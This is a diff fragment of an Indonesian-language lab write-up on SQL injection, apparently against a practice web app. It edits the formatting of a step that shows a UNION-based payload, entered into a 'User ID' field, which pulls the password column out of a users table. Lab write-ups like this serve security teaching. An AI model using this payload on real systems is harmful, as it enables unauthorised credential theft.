@@ -95,9 +95,9 @@ cari ip dengan awalan 192
   ``` SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT password, null FROM users -- '; ```  
 
 * Setelah itu, kita masukkan ke text input `User ID`  
-  `1' UNION SELECT password, null FROM users -- '; ``` `  
+  `1' UNION SELECT password, null FROM users -- '; `  
 
-  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu `' UNION SELECT password, null FROM users -- '; `` `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.  
+  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu ` UNION SELECT password, null FROM users -- '; `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.  
 
 8. Hasil serangan:  
    ![SQLI2](src/SQLI2.png)
